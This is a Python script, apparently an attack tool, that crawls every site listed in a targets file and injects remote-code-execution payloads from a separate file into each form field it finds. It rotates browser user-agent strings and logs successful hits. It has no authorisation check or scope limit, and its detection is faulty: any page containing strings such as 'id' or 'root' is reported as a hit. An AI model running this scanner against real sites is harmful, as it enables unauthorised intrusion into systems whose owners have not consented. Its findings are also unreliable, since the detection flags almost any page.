import requests
import time
import os
import sys
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from random import choice
import re

# Configurable Parameters
TARGET_FILE = 'Targets.txt'
SUCCESS_FILE = 'success.txt'
PAYLOADS_FILE = 'RCEPayloads.txt'
MAX_DEPTH = 10
TIMEOUT = 10  # seconds for requests
USER_AGENT_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
]

# Read RCE payloads from the external file
def load_payloads():
    with open(PAYLOADS_FILE, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip() and not line.startswith("#")]

# Extract input parameters from a webpage using BeautifulSoup
def extract_params(url):
    try:
        response = requests.get(url, headers={'User-Agent': choice(USER_AGENT_LIST)}, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        params = []

        # Find all forms and input fields
        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                param_name = input_tag.get('name')
                if param_name:
                    params.append((url, param_name))
        return params
    except requests.RequestException as e:
        print(f"Error extracting parameters from {url}: {e}")
        return []

# Test the payloads on the parameters
def test_rce(url, params, payloads):
    success = []
    
    # Loop through all input parameters and test payloads
    for param in params:
        full_url, param_name = param
        for payload in payloads:
            # Inject payload
            payload_url = f"{full_url}?{param_name}={payload}"
            try:
                response = requests.get(payload_url, headers={'User-Agent': choice(USER_AGENT_LIST)}, timeout=TIMEOUT)
                if detect_rce(response.text):
                    success.append((payload_url, payload, response.text))
            except requests.RequestException as e:
                print(f"Error testing {payload_url}: {e}")
                
    return success

# Detect potential RCE indicators in the response
def detect_rce(response_text):
    # Common RCE indicators in output: shell command results
    if "root" in response_text or "uid" in response_text or "id" in response_text or "whoami" in response_text:
        return True
    # Also check for other possible system-related output (e.g., `uname`, `ps`, etc.)
    if re.search(r"(\buname\b|\bps\b|\bps aux\b)", response_text):
        return True
    return False

# Save the successful RCE results into a file
def save_success(success_results):
    with open(SUCCESS_FILE, 'a') as f:
        for result in success_results:
            f.write(f"URL: {result[0]}\nPayload: {result[1]}\nResponse:\n{result[2]}\n\n{'='*50}\n")

# Crawl the site and test RCE on multiple pages
def crawl_and_test_rce(base_url):
    # Load RCE payloads
    payloads = load_payloads()
    
    # Start crawling the base URL
    visited = set()
    to_visit = [base_url]
    depth = 0
    success_results = []
    
    while to_visit and depth < MAX_DEPTH:
        url = to_visit.pop()
        if url in visited:
            continue
        visited.add(url)

        print(f"Crawling URL: {url} (Depth: {depth})")
        
        # Extract parameters
        params = extract_params(url)
        if params:
            print(f"Testing {len(params)} parameters on {url}")
            results = test_rce(url, params, payloads)
            if results:
                success_results.extend(results)
        
        # Parse and add any new links to the crawl queue
        try:
            response = requests.get(url, headers={'User-Agent': choice(USER_AGENT_LIST)}, timeout=TIMEOUT)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link.get('href')
                full_url = urljoin(url, href)
                if full_url not in visited:
                    to_visit.append(full_url)
        except requests.RequestException as e:
            print(f"Error crawling {url}: {e}")
        
        depth += 1
        time.sleep(2)  # Delay to prevent rate-limiting

    if success_results:
        save_success(success_results)
        print(f"RCE vulnerabilities found. Results saved to {SUCCESS_FILE}")
    else:
        print("No RCE vulnerabilities found.")

# Main function to drive the script
def main():
    if not os.path.exists(TARGET_FILE):
        print(f"Error: {TARGET_FILE} not found.")
        sys.exit(1)
    
    with open(TARGET_FILE, 'r') as f:
        targets = [line.strip() for line in f.readlines() if line.strip()]

    if not targets:
        print("Error: No targets in the list.")
        sys.exit(1)

    for target in targets:
        print(f"Starting RCE scan on target: {target}")
        crawl_and_test_rce(target)
        print(f"Finished RCE scan for {target}")

if __name__ == "__main__":
    main()
